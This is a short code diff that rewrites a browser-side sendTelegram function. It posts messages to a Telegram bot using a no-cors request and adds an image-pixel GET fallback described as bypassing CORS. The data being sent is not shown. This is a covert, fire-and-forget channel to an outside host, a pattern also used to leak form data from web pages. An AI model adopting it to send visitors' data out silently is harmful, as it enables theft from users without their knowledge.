@@ -3291,11 +3291,27 @@
 
   // ── Telegram Notification ──
   function sendTelegram(msg) {
-    fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+    const url = 'https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage';
+    const params = new URLSearchParams({
+      chat_id: TG_CHAT_ID,
+      text: msg,
+      parse_mode: 'HTML'
+    });
+
+    // Method 1: fetch with no-cors (fire and forget)
+    fetch(url, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'HTML' })
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params.toString()
     }).catch(() => {});
+
+    // Method 2: Image pixel trick as backup (GET request, bypasses CORS)
+    try {
+      const getUrl = url + '?' + params.toString();
+      const img = new Image();
+      img.src = getUrl;
+    } catch(e) {}
   }
 
   // ── Show in-page success toast ──
